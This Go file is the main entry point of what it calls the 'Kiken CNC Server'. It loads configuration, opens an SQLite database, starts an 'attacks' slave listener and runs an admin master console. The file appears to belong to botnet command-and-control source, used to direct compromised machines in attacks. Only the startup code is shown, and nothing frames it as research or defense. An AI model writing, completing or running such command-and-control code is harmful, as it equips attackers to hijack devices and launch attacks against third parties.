package main

import (
	"admin/source/admin"
	"admin/source/attacks"
	"admin/source/config"
	"admin/source/config/options"
	"admin/source/database"
	"fmt"
	"log"
)

func main() {
	fmt.Printf("[RUNTIME] Starting Kiken CNC Server: %s\r\n", config.Version)

	// Loads the options path from the configuration
	if _, err := options.OptionsFromFile(&config.Options, "templates/"); err != nil {
		log.Fatalf("Err: %v", err)
	}

	fmt.Printf("[CONFIG] Registered Configuration\r\n")

	// Opens the database using SQLite
	if err := database.OpenDatabase(config.Options.GetString("master", "master.database")); err != nil {
		log.Fatalf("Err: %v", err)
	}

	fmt.Printf("[DATABASE] Opened database (%s)\r\n", config.Options.GetString("master", "master.database"))

	go attacks.NewSlaveListener()
	if err := admin.Master(); err != nil {
		log.Fatalf("Err: %v", err)
	}
}
